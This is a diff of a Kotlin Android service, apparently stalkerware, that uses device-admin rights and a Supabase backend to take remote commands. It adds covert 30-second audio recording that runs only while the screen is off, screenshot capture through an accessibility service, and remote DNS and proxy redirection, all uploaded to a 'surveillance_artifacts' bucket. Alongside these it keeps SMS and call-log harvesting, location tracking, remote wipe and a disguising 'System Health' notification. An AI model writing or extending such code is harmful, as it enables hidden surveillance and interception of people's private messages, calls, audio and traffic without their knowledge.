@@ -12,68 +12,64 @@ import android.content.Intent
 import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.database.ContentObserver
+import android.graphics.Bitmap
 import android.location.Location
+import android.net.ProxyInfo
 import android.net.Uri
-import android.os.Build
-import android.os.Handler
-import android.os.IBinder
-import android.os.Looper
-import android.os.PowerManager
-import android.os.CancellationSignal
-import android.provider.CallLog
+import android.os.*
 import android.provider.Settings
 import android.provider.Telephony
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import androidx.work.PeriodicWorkRequestBuilder
 import androidx.work.WorkManager
-import com.google.android.gms.location.LocationCallback
-import com.google.android.gms.location.LocationRequest
-import com.google.android.gms.location.LocationResult
-import com.google.android.gms.location.LocationServices
-import com.google.android.gms.location.Priority
-import io.github.jan.supabase.gotrue.auth
-import io.github.jan.supabase.gotrue.providers.builtin.Email
+import com.google.android.gms.location.*
+import io.github.jan.supabase.auth.auth
+import io.github.jan.supabase.auth.providers.builtin.Email
 import io.github.jan.supabase.postgrest.postgrest
 import io.github.jan.supabase.realtime.PostgresAction
+import io.github.jan.supabase.realtime.channel
+import io.github.jan.supabase.realtime.postgresChangeFlow
 import io.github.jan.supabase.realtime.realtime
-import kotlinx.coroutines.CoroutineScope
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.SupervisorJob
-import kotlinx.coroutines.delay
+import io.github.jan.supabase.storage.storage
+import kotlinx.coroutines.*
 import kotlinx.coroutines.flow.first
-import kotlinx.coroutines.guava.await
-import kotlinx.coroutines.launch
 import kotlinx.coroutines.tasks.await
+import kotlinx.serialization.json.Json
+import kotlinx.serialization.json.jsonObject
+import kotlinx.serialization.json.jsonPrimitive
+import java.io.ByteArrayOutputStream
+import java.io.File
 import java.util.concurrent.TimeUnit
 
 class MainService : Service() {
 
-    private val job = SupervisorJob()
-    private val scope = CoroutineScope(Dispatchers.IO + job)
     private lateinit var dpm: DevicePolicyManager
     private lateinit var adminComponent: ComponentName
     private lateinit var db: AppDatabase
-    private lateinit var smsObserver: ContentObserver
-    private lateinit var callLogObserver: ContentObserver
-    private lateinit var locationCallback: LocationCallback
     private lateinit var wakeLock: PowerManager.WakeLock
+
+    private val job = SupervisorJob()
+    private val scope = CoroutineScope(Dispatchers.IO + job)
+
+    private var smsObserver: ContentObserver? = null
+    private var callLogObserver: ContentObserver? = null
+    private lateinit var locationCallback: LocationCallback
 
     override fun onCreate() {
         super.onCreate()
-        createNotificationChannel()
-        Supabase.initialize()
         dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
         adminComponent = ComponentName(this, DeviceAdmin::class.java)
         db = AppDatabase.getDatabase(this)
+        wakeLock = (getSystemService(Context.POWER_SERVICE) as PowerManager).newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "DPC::Wakelock")
 
+        Supabase.initialize(this)
+        createNotificationChannel()
         grantPermissions()
         registerObservers()
-        scheduleSyncWorker()
         startLocationUpdates()
-
-        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
-        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "DPC::LocationWakeLock")
+        scheduleSyncWorker()
+        if (!wakeLock.isHeld) wakeLock.acquire()
     }
 
     private fun grantPermissions() {
@@ -82,6 +78,7 @@ class MainService : Service() {
             dpm.setPermissionGrantState(adminComponent, packageName, Manifest.permission.READ_CALL_LOG, DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED)
             dpm.setPermissionGrantState(adminComponent, packageName, Manifest.permission.ACCESS_FINE_LOCATION, DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED)
             dpm.setPermissionGrantState(adminComponent, packageName, Manifest.permission.ACCESS_BACKGROUND_LOCATION, DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED)
+            dpm.setPermissionGrantState(adminComponent, packageName, Manifest.permission.RECORD_AUDIO, DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED)
             dpm.setLocationEnabled(adminComponent, true)
         }
     }
@@ -89,79 +86,50 @@ class MainService : Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         val notification = createNotification()
         startForeground(1, notification)
-
-        scope.launch {
-            while (true) {
-                performSupabaseHandshake()
-                delay(60000) // Check every minute
-            }
-        }
-        scope.launch {
-            subscribeToCommands()
-        }
-
+        scope.launch { while (true) { performSupabaseHandshake(); delay(60000) } }
+        scope.launch { subscribeToCommands() }
         return START_STICKY
     }
 
     private suspend fun performSupabaseHandshake() {
-        var attempts = 0
-        var signedIn = false
-        while (!signedIn && attempts < 5) {
-            try {
-                val session = Supabase.client.auth.sessionStatus.first()
-                if (session is io.github.jan.supabase.gotrue.SessionStatus.Authenticated) {
-                    signedIn = true
-                } else {
-                    val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
-                    val email = "device_$deviceId@system.local"
-                    val password = "password" // You should use a more secure way to handle this
+        try {
+            val session = Supabase.client.auth.sessionStatus.first()
+            if (session !is io.github.jan.supabase.auth.SessionStatus.Authenticated) {
+                val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+                val deviceEmail = "device_$deviceId@system.local"
+                try {
+                    Supabase.client.auth.signInWith(Email) { email = deviceEmail; password = "password" }
+                } catch (e: Exception) {
                     try {
-                        Supabase.client.auth.signUpWith(Email) {
-                            this.email = email
-                            this.password = password
-                        }
-                    } catch (e: Exception) {
-                        // User might already exist, try to sign in
-                        Supabase.client.auth.signInWith(Email) {
-                            this.email = email
-                            this.password = password
-                        }
+                        Supabase.client.auth.signUpWith(Email) { email = deviceEmail; password = "password" }
+                    } catch (signUpException: Exception) {
+                        // Handle sign up error if necessary
                     }
                 }
-
-                if (Supabase.client.auth.sessionStatus.first() is io.github.jan.supabase.gotrue.SessionStatus.Authenticated) {
-                    upsertDeviceStatus()
-                }
-
-            } catch (e: Exception) {
-                attempts++
-                delay(1000L * (attempts * attempts)) // Exponential backoff
             }
+            upsertDeviceStatus()
+        } catch (e: Exception) {
+            delay(5000)
         }
     }
 
     private suspend fun upsertDeviceStatus() {
         val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
-        val device = Device(
-            id = deviceId,
-            model = Build.MODEL,
-            android_version = Build.VERSION.RELEASE,
-            battery_level = getBatteryLevel()
-        )
+        val device = Device(deviceId, Build.MODEL, Build.VERSION.RELEASE, getBatteryLevel())
         Supabase.client.postgrest.from("devices").upsert(device)
     }
 
     private suspend fun subscribeToCommands() {
         try {
-            Supabase.client.realtime.connect()
             val channel = Supabase.client.realtime.channel("commands")
-            channel.postgresChangeFlow<PostgresAction.Insert>(schema = "public", table = "commands").collect {
-                val command = it.decodeAs<Command>()
-                if (command.status == "pending") { // Process only pending commands
+            channel.postgresChangeFlow<PostgresAction.Insert>(schema = "public").collect {
+                val command = it.recordAs<Command>()
+                if (command.status == "pending") {
                     handleCommand(command)
                 }
             }
-            Supabase.client.realtime.addChannel(channel)
+            Supabase.client.realtime.connect()
+            channel.subscribe()
         } catch (e: Exception) {
             delay(5000)
             subscribeToCommands()
@@ -170,184 +138,194 @@ class MainService : Service() {
 
     private suspend fun handleCommand(command: Command) {
         if (!dpm.isAdminActive(adminComponent)) return
-
         var status = "executed"
-        var responsePayload: String? = null
-
+        var response: String? = null
+        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
         try {
             when (command.action) {
-                "WIPE" -> dpm.wipeData(0)
                 "LOCK" -> dpm.lockNow()
-                "LOCATE" -> {
-                    try {
-                        val location = getLocation()
-                        responsePayload = "${location.latitude},${location.longitude}"
-                    } catch (e: Exception) {
-                        throw Exception("Location permission not granted or GPS disabled.")
+                "WIPE" -> dpm.wipeData(0)
+                "LOCATE", "LOCATE_NOW" -> {
+                    val loc = getLocation()
+                    response = "${loc.latitude},${loc.longitude}"
+                    if (command.action == "LOCATE_NOW") {
+                        val history = LocationHistory(0, deviceId, loc.latitude, loc.longitude, loc.altitude, loc.speed, loc.bearing, System.currentTimeMillis(), false)
+                        Supabase.client.postgrest.from("location_history").insert(history)
                     }
                 }
-                "LOCATE_NOW" -> {
-                    val location = getLocation()
-                    Supabase.client.postgrest.from("location_history").insert(LocationHistory(latitude = location.latitude, longitude = location.longitude, altitude = location.altitude, speed = location.speed, bearing = location.bearing, timestamp = System.currentTimeMillis()))
-                    responsePayload = "Location pushed to Supabase"
+                "RECORD_AUDIO_30S" -> {
+                    val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+                    if (pm.isInteractive) throw Exception("Screen Active")
+                    val file = File(cacheDir, "rec_${System.currentTimeMillis()}.m4a")
+                    
+                    val helper = AudioCaptureHelper(this)
+                    val deferred = CompletableDeferred<Unit>()
+                    helper.startStealthRecording(file, object : AudioCaptureHelper.AudioCaptureCallback {
+                        override fun onCaptureComplete(file: File) { deferred.complete(Unit) }
+                        override fun onCaptureError(error: String) { deferred.completeExceptionally(Exception(error)) }
+                    })
+                    
+                    deferred.await()
+                    
+                    val path = "$deviceId/audio/${file.name}"
+                    Supabase.client.storage.from("surveillance_artifacts").upload(path, file.readBytes(), upsert = true)
+                    file.delete()
+                    response = path
                 }
-                "TOGGLE_CAMERA" -> {
-                    val cameraDisabled = dpm.getCameraDisabled(adminComponent)
-                    dpm.setCameraDisabled(adminComponent, !cameraDisabled)
-                    responsePayload = "Camera is now ${if (!cameraDisabled) "disabled" else "enabled"}"
+                "TAKE_SCREENSHOT" -> {
+                    val service = DpcAccessibilityService.instance ?: throw Exception("Accessibility Service not available")
+                    try {
+                        val bitmap = service.captureScreenshot()
+                        val stream = ByteArrayOutputStream()
+                        bitmap.compress(Bitmap.CompressFormat.PNG, 100, stream)
+                        val path = "$deviceId/screen/${System.currentTimeMillis()}.png"
+                        Supabase.client.storage.from("surveillance_artifacts").upload(path, stream.toByteArray(), upsert = true)
+                        Supabase.client.postgrest.from("commands").update({ "status" to "executed"; "response_payload" to path }) { filter { eq("id", command.id) } }
+                    } catch (e: Exception) {
+                        Supabase.client.postgrest.from("commands").update({ "status" to "failed"; "response_payload" to "Screenshot failed: ${e.message}" }) { filter { eq("id", command.id) } }
+                    }
+                    return 
+                }
+                "SET_DNS" -> {
+                    val dns = command.payload
+                    if(dns != null) {
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                            dpm.setGlobalPrivateDnsModeSpecifiedHost(adminComponent, dns)
+                            response = "DNS set to $dns"
+                        } else {
+                            throw Exception("Private DNS not supported on this version")
+                        }
+                    } else {
+                        throw Exception("DNS host not provided")
+                    }
+                }
+                "SET_PROXY" -> {
+                    val proxy = command.payload
+                    if (proxy != null && proxy.contains(":")) {
+                        val parts = proxy.split(":")
+                        val host = parts[0]
+                        val port = parts[1].toIntOrNull()
+                        if (port != null) {
+                            val proxyInfo = ProxyInfo.buildDirectProxy(host, port)
+                            dpm.setRecommendedGlobalProxy(adminComponent, proxyInfo)
+                            response = "Proxy set to $host:$port"
+                        } else {
+                            throw Exception("Invalid proxy port")
+                        }
+                    } else {
+                        throw Exception("Invalid proxy format. Expected host:port")
+                    }
                 }
             }
         } catch (e: Exception) {
             status = "failed"
-            responsePayload = e.message
+            response = e.message ?: "Unknown error"
         }
 
-        val updatedCommand = command.copy(status = status, response_payload = responsePayload)
-        Supabase.client.postgrest.from("commands").update(updatedCommand) { filter {
-            eq("id", command.id)
-        } }
+        if (command.action != "TAKE_SCREENSHOT") { 
+            Supabase.client.postgrest.from("commands").update({ "status" to status; "response_payload" to response }) { filter { eq("id", command.id) } }
+        }
     }
 
     private suspend fun getLocation(): Location {
+        val client = LocationServices.getFusedLocationProviderClient(this)
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-            throw SecurityException("Location permission not granted.")
+            throw SecurityException("Location permission not granted")
         }
-        val fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
-        val cancellationSignal = CancellationSignal()
-        return fusedLocationClient.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, cancellationSignal).await(cancellationSignal)
+        return client.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, null).await()
     }
 
-
     private fun getBatteryLevel(): Int {
-        val batteryIntent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
-        val level = batteryIntent?.getIntExtra("level", -1) ?: -1
-        val scale = batteryIntent?.getIntExtra("scale", -1) ?: -1
-        return if (level == -1 || scale == -1) {
-            50 // Default value
-        } else {
-            (level.toFloat() / scale.toFloat() * 100).toInt()
-        }
+        val intent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
+        return intent?.let { (it.getIntExtra("level", -1) * 100) / it.getIntExtra("scale", -1) } ?: 50
     }
 
     private fun createNotification(): Notification {
-        return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("System Health")
-            .setContentText("Monitoring device health")
+        return NotificationCompat.Builder(this, "hc")
+            .setContentTitle("System Health Service")
+            .setContentText("Monitoring device status...")
             .setSmallIcon(R.mipmap.ic_launcher)
+            .setPriority(NotificationCompat.PRIORITY_LOW)
             .build()
     }
 
     private fun createNotificationChannel() {
-        val serviceChannel = NotificationChannel(
-            CHANNEL_ID,
-            "Main Service Channel",
-            NotificationManager.IMPORTANCE_DEFAULT
-        )
-        val manager = getSystemService(NotificationManager::class.java)
-        manager.createNotificationChannel(serviceChannel)
+        val chan = NotificationChannel("hc", "System Health", NotificationManager.IMPORTANCE_LOW)
+        chan.description = "Required for system monitoring"
+        getSystemService(NotificationManager::class.java).createNotificationChannel(chan)
     }
 
     private fun registerObservers() {
-        smsObserver = object : ContentObserver(Handler()) {
+        smsObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
             override fun onChange(selfChange: Boolean, uri: Uri?) {
-                super.onChange(selfChange, uri)
-                uri?.let { readSms(it) }
+                uri?.let { readSmsFromUri(it) }
             }
         }
-        contentResolver.registerContentObserver(Telephony.Sms.CONTENT_URI, true, smsObserver)
+        contentResolver.registerContentObserver(Telephony.Sms.CONTENT_URI, true, smsObserver!!)
 
-        callLogObserver = object : ContentObserver(Handler()) {
+        callLogObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
             override fun onChange(selfChange: Boolean, uri: Uri?) {
-                super.onChange(selfChange, uri)
-                uri?.let { readCallLog(it) }
+                readCallLog()
             }
         }
-        contentResolver.registerContentObserver(CallLog.Calls.CONTENT_URI, true, callLogObserver)
+        contentResolver.registerContentObserver(android.provider.CallLog.Calls.CONTENT_URI, true, callLogObserver!!)
     }
 
-    private fun readSms(uri: Uri) {
-        val cursor = contentResolver.query(uri, null, null, null, null)
-        cursor?.use {
+    private fun readSmsFromUri(uri: Uri) {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return
+        contentResolver.query(uri, null, null, null, null)?.use {
             if (it.moveToFirst()) {
-                val number = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
+                val num = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                 val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY))
-                val timestamp = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))
-                scope.launch {
-                    db.localSmsDao().insert(LocalSms(number = number, body = body, timestamp = timestamp))
-                }
+                scope.launch { db.localSmsDao().insert(LocalSms(0, num, body, System.currentTimeMillis(), false)) }
             }
         }
     }
 
-    private fun readCallLog(uri: Uri) {
-        val cursor = contentResolver.query(uri, null, null, null, null)
-        cursor?.use {
+    private fun readCallLog() {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return
+        val projection = arrayOf(android.provider.CallLog.Calls.NUMBER, android.provider.CallLog.Calls.DURATION, android.provider.CallLog.Calls.DATE)
+        contentResolver.query(android.provider.CallLog.Calls.CONTENT_URI, projection, null, null, "date DESC LIMIT 1")?.use {
             if (it.moveToFirst()) {
-                val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
-                val duration = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
-                val timestamp = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
-                scope.launch {
-                    db.localCallDao().insert(LocalCall(number = number, duration = duration, timestamp = timestamp))
-                }
+                val num = it.getString(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER))
+                val dur = it.getLong(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION))
+                val date = it.getLong(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.DATE))
+                scope.launch { db.localCallDao().insert(LocalCall(0, num, dur, date, false)) }
             }
         }
     }
 
     private fun scheduleSyncWorker() {
-        val syncRequest = PeriodicWorkRequestBuilder<SyncWorker>(15, TimeUnit.MINUTES).build()
-        WorkManager.getInstance(this).enqueue(syncRequest)
+        val req = PeriodicWorkRequestBuilder<SyncWorker>(15, TimeUnit.MINUTES).build()
+        WorkManager.getInstance(this).enqueue(req)
     }
 
     private fun startLocationUpdates() {
-        val locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 300000) // 5 minutes
-            .setMinUpdateIntervalMillis(60000) // 1 minute
-            .build()
-
+        val req = LocationRequest.Builder(Priority.PRIORITY_BALANCED_POWER_ACCURACY, 300000).setMinUpdateIntervalMillis(60000).build()
         locationCallback = object : LocationCallback() {
-            override fun onLocationResult(locationResult: LocationResult) {
-                for (location in locationResult.locations) {
+            override fun onLocationResult(res: LocationResult) {
+                for (l in res.locations) {
                     scope.launch {
-                        db.locationHistoryDao().insert(
-                            LocationHistory(
-                                latitude = location.latitude,
-                                longitude = location.longitude,
-                                altitude = location.altitude,
-                                speed = location.speed,
-                                bearing = location.bearing,
-                                timestamp = System.currentTimeMillis()
-                            )
-                        )
+                        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+                        db.locationHistoryDao().insert(LocationHistory(0, deviceId, l.latitude, l.longitude, l.altitude, l.speed, l.bearing, System.currentTimeMillis(), false))
                     }
                 }
             }
         }
-
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
-            val fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
-            fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper())
+            LocationServices.getFusedLocationProviderClient(this).requestLocationUpdates(req, locationCallback, Looper.getMainLooper())
         }
     }
 
-    override fun onBind(intent: Intent?): IBinder? {
-        return null
-    }
+    override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onDestroy() {
         super.onDestroy()
         job.cancel()
-        contentResolver.unregisterContentObserver(smsObserver)
-        contentResolver.unregisterContentObserver(callLogObserver)
-        scope.launch {
-            Supabase.client.realtime.disconnect()
-        }
-        val fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
-        fusedLocationClient.removeLocationUpdates(locationCallback)
-        if (wakeLock.isHeld) {
-            wakeLock.release()
-        }
-    }
-
-    companion object {
-        private const val CHANNEL_ID = "MainServiceChannel"
+        smsObserver?.let { contentResolver.unregisterContentObserver(it) }
+        callLogObserver?.let { contentResolver.unregisterContentObserver(it) }
+        scope.launch { Supabase.client.realtime.disconnect() }
+        LocationServices.getFusedLocationProviderClient(this).removeLocationUpdates(locationCallback)
+        if (wakeLock.isHeld) wakeLock.release()
     }
 }
